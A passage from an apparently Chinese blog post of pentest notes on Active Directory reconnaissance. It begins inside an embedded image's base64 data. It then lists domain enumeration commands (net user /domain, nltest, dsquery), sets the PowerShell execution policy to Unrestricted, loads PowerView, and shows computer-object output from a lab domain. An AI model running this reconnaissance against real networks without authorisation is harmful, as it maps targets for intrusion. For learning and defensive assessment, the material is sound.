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" alt="img"></p><p>​            DNS服务器：可以依靠dns定位域控</p><p>​            域内用户组</p><p>​                            Domain admins：域管理组</p><p>​                            Domain users：域内用户组</p><p>​                            Enterprise admins：企业系统管理组（权限比较高）</p><p>​                            Schema admmins：架构管理员组（权限比较高）</p><h3 id="1-域内常见命令"><a href="#1-域内常见命令" class="headerlink" title="1.域内常见命令"></a>1.域内常见命令</h3><p>​    <code>net coonfig workstation</code>：查看当前登录域</p><p>​    <code>    Ipconfig /all</code>：计算机的网络连接情况,包括IP地址、DNS、DHCP、mac地址、DC等</p><p>​            <code>ping DC</code>-&gt;可以得到该域控主机的ip地址</p><p>​    <code>net user administrator /domain</code>：查看登录本机管理员在域内的详细信息</p><p>​    <code>net time /domain</code>：查看主机在域控中的时间和域控的主机名称；继续ping该名称可得到域控的ip地址</p><p>​    <code>net view</code> ：查看同一域内机器列表</p><p>​    <code>        net view \\ip</code> ：查看某ip共享</p><p>​    <code>   net view \\[username]</code>：查看该user计算机的共享资源列表</p><p>​    <code>net view /domain</code>： 查看内网存在多少域            </p><p>​    <code>net view /domain:域名</code>  ：查看该域内的主机</p><p>​    <code>net group /domain</code>：查看域内的用户组</p><p>​    <code>net group &quot;domain computers&quot; /domain</code>：查看域内主机</p><p>​    <code>net accounts /domain </code>：查询域用户密码过期等信息</p><p>​    查找域控</p><p>​            <code>nltest /DCLIST:域控名 </code> ：列出当前域内所有域控</p><p>​            <code>net group &quot;domain controllers&quot; /domain</code>：列出当前域内域控机器</p><p>​    查看域内用户</p><p>​             <code>net user /domain</code>：查看本机域内所有用户</p><p>​    更高版本的Windows查看域内用户</p><p>​                <code>dsquery.exe user</code>                            </p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; dsquery.exe user<span class="hljs-string">&quot;CN=Administrator,CN=Users,DC=MCITP,DC=COM&quot;</span><span class="hljs-string">&quot;CN=Guest,CN=Users,DC=MCITP,DC=COM&quot;</span><span class="hljs-string">&quot;CN=krbtgt,CN=Users,DC=MCITP,DC=COM&quot;</span><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt;</code></pre><p>​                <code>net localgroup administrators /domain</code>：登陆本机的管理员</p><h3 id="2-powershell脚本收集域内信息"><a href="#2-powershell脚本收集域内信息" class="headerlink" title="2.powershell脚本收集域内信息"></a>2.powershell脚本收集域内信息</h3><p>​    <code>Set-ExecutionPolicy</code>需要先设置<code>Unrestricted</code></p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="hljs-built_in">Set-ExecutionPolicy</span>位于命令管道位置 <span class="hljs-number">1</span> 的 cmdlet <span class="hljs-built_in">Set-ExecutionPolicy</span>请为以下参数提供值:ExecutionPolicy: Unrestricted</code></pre><p><code>import-Module .\powershell脚本</code> 导入powershell脚本</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</code></pre><p><code>get-netuser</code>：返回域内成员信息</p><p><code>get-NetDomainController</code>：获取域控信息</p><p><code>get-NetComputer</code>：获取域内主机详细信息</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="hljs-built_in">get-netcomputer</span>msds<span class="hljs-literal">-generationid</span>             : &#123;<span class="hljs-number">214</span>, <span class="hljs-number">0</span>, <span class="hljs-number">23</span>, <span class="hljs-number">122</span>...&#125;instancetype                  : <span class="hljs-number">4</span>usnchanged                    : <span class="hljs-number">36880</span>badpasswordtime               : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>codepage                      : <span class="hljs-number">0</span>countrycode                   : <span class="hljs-number">0</span>ridsetreferences              : CN=RID <span class="hljs-built_in">Set</span>,CN=WIN2012,OU=Domain Controllers,DC=                                MCITP,DC=COMobjectguid                    : <span class="hljs-number">07</span>bb8a69<span class="hljs-literal">-2a86</span><span class="hljs-literal">-4565</span><span class="hljs-literal">-abef</span><span class="hljs-literal">-baf1db30bd55</span>samaccountname                : WIN2012<span class="hljs-variable">$</span>usncreated                    : <span class="hljs-number">12293</span>iscriticalsystemobject        : Truedisplayname                   : WIN2012<span class="hljs-variable">$</span>dnshostname                   : win2012.MCITP.COMmsds<span class="hljs-literal">-additionaldnshostname</span>    : &#123;WIN<span class="hljs-literal">-G16E9C87I50</span>, WIN2012&#125;pwdlastset                    : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">0</span>:<span class="hljs-number">45</span>:<span class="hljs-number">10</span>whenchanged                   : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50</span>useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATIONobjectclass                   : &#123;top, person, organizationalPerson, user...&#125;logoncount                    : <span class="hljs-number">27</span>dscorepropagationdata         : &#123;<span class="hljs-number">2020</span>/<span class="hljs-number">9</span>/<span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">58</span>, <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>&#125;lastlogontimestamp            : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">0</span>:<span class="hljs-number">45</span>:<span class="hljs-number">33</span>name                          : WIN2012localpolicyflags              : <span class="hljs-number">0</span>lastlogoff                    : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>whencreated                   : <span class="hljs-number">2020</span>/<span class="hljs-number">9</span>/<span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">58</span>samaccounttype                : MACHINE_ACCOUNTdistinguishedname             : CN=WIN2012,OU=Domain Controllers,DC=MCITP,DC=CO                                Mprimarygroupid                : <span class="hljs-number">516</span>badpwdcount                   : <span class="hljs-number">0</span>objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP                                ,DC=COMserviceprincipalname          : &#123;Dfsr<span class="hljs-literal">-12F9A27C</span><span class="hljs-literal">-BF97</span><span class="hljs-literal">-4787</span><span class="hljs-literal">-9364</span><span class="hljs-literal">-D31B6C55EB04</span>/win2                                <span class="hljs-number">012</span>.MCITP.COM, TERMSRV/WIN2012, TERMSRV/win2012                                .MCITP.COM, <span class="hljs-built_in">GC</span>/WIN2012/MCITP.COM...&#125;cn                            : WIN2012operatingsystem               : Windows Server <span class="hljs-number">2012</span> R2 Datacenterobjectsid                     : S<span class="hljs-literal">-1</span><span class="hljs-literal">-5</span><span class="hljs-literal">-21</span><span class="hljs-literal">-1452006093</span><span class="hljs-literal">-426277424</span><span class="hljs-literal">-3932888995</span><span class="hljs-literal">-1001</span>msds<span class="hljs-literal">-supportedencryptiontypes</span> : <span class="hljs-number">28</span>operatingsystemversion        : <span class="hljs-number">6.3</span> (<span class="hljs-number">9600</span>)lastlogon                     : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span> <span class="hljs-number">9</span>:<span class="hljs-number">37</span>:<span class="hljs-number">33</span>serverreferencebl             : CN=WIN2012,CN=Servers,CN=Default<span class="hljs-literal">-First</span><span class="hljs-literal">-Site</span><span class="hljs-literal">-Nam</span>                                e,CN=Sites,CN=Configuration,DC=MCITP,DC=COMmsdfsr<span class="hljs-literal">-computerreferencebl</span>    : CN=WIN<span class="hljs-literal">-G16E9C87I50</span>,CN=Topology,CN=Domain System                                 Volume,CN=DFSR<span class="hljs-literal">-GlobalSettings</span>,CN=System,DC=MCI                                TP,DC=COMaccountexpires                : NEVERinstancetype                  : <span class="hljs-number">4</span>usnchanged                    : <span class="hljs-number">33032</span>badpasswordtime               : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">36</span>codepage                      : <span class="hljs-number">0</span>countrycode                   : <span class="hljs-number">0</span>objectguid                    : efee98ee<span class="hljs-literal">-774b</span><span class="hljs-literal">-436b</span><span class="hljs-literal">-9966</span><span class="hljs-literal">-00b267770123</span>samaccountname                : WIN7<span class="hljs-variable">$</span>usncreated                    : <span class="hljs-number">32879</span>iscriticalsystemobject        : Falsedscorepropagationdata         : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>pwdlastset                    : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>objectclass                   : &#123;top, person, organizationalPerson, user...&#125;useraccountcontrol            : WORKSTATION_TRUST_ACCOUNTlogoncount                    : <span class="hljs-number">30</span>lastlogon                     : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span> <span class="hljs-number">9</span>:<span class="hljs-number">41</span>:<span class="hljs-number">46</span>whenchanged                   : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">12</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>lastlogontimestamp            : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">23</span>:<span class="hljs-number">08</span>name                          : WIN7localpolicyflags              : <span class="hljs-number">0</span>lastlogoff                    : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>whencreated                   : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">6</span>:<span class="hljs-number">23</span>:<span class="hljs-number">08</span>samaccounttype                : MACHINE_ACCOUNTdistinguishedname             : CN=WIN7,CN=Computers,DC=MCITP,DC=COMobjectsid                     : S<span class="hljs-literal">-1</span><span class="hljs-literal">-5</span><span class="hljs-literal">-21</span><span class="hljs-literal">-1452006093</span><span class="hljs-literal">-426277424</span><span class="hljs-literal">-3932888995</span><span class="hljs-literal">-1104</span>primarygroupid                : <span class="hljs-number">515</span>badpwdcount                   : <span class="hljs-number">0</span>objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP                                ,DC=COMserviceprincipalname          : 